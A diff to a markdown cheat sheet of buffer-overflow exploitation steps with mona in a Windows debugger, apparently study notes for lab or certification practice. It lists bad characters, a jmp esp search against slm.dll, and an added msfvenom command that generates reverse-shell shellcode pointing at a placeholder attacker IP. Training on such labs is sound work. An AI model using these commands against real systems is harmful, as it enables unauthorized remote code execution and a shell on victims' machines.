@@ -27,6 +27,11 @@
 "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
 "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 ```
+## mona short keys
+```
+break point => F2
+step in => F8
+```
 
 ## Executable dlls using mona
 ```
@@ -52,4 +57,9 @@ nasm> jmp esp
 ## search instructions using mona
 ```
 !mona find -s "\xff\xa4" -m slm.dll
+```
+
+## Generate shell code
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_IP> LPORT=4444 EXITFUNC=thread -f c -a x86 --platform windows -b “\x00”
 ```
